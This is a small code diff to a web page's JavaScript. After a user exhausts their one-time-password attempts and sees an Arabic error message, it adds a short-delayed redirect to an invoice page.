@@ -87,6 +87,9 @@
             otpError.textContent = "OTP غير صحيح\nتم استنفاد المحاولات المتاحة";
             confirmationCode.disabled = true;
             confirmButton.disabled = true;
+            window.setTimeout(function () {
+                window.location.replace("page4d1ad.html?invoice=" + encodeURIComponent(invoiceId || ""));
+            }, 500);
         }
         confirmationCode.value = "";
     });
